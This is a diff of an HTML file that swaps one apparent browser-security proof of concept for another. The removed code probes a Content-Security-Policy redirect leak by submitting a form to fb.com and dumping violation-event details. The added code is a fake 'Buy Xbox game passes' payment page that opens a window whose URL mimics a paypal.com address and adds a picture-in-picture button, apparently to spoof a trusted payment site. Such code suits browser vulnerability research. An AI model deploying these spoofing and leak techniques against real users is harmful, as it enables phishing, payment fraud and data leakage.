@@ -1,33 +1,10 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>CSP Redirect URL</title>
-<meta http-equiv="Content-Security-Policy" content="default-src 'unsafe-inline' 'self'; form-action fb.com">
-</head>
-<body>
-<form id="form" action="https://fb.com/4"></form>
-<button>Exploit</button>
-<script>
-    //const url = 'https://fb.com/4';
-    //window.addEventListener('DOMContentLoaded', e => exploit());
-    document.querySelector('button').addEventListener('click', e => exploit());
-    document.addEventListener('securitypolicyviolation', e => {
-      const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
-      document.write('<pre>'+JSON.stringify(e,[...props],2)+'</pre>');
-    });
+<h1>Buy Xbox game passes</h1>
+<button id="pipButton">Make payment.</button>
 
-    async function exploit(url) {
-      const win = window.open('about:blank');
-      try{
-        win.close()
-      }
-      catch(e){
-        console.log(e);
-      }
-      finally{
-        document.querySelector('#form').submit();
-      }
-    }
-    </script>
-</body>
-</html>
+<script>
+pipButton.addEventListener("click", async () => {
+  const player = document.querySelector("#player");
+  const w = window.open("about:blank#very-super-duper-long-subdomain.paypal.com") 
+  w.document.write("<button onclick='documentPictureInPicture.requestWindow()'>Click to proceed to payment</button>")
+});
+</script>
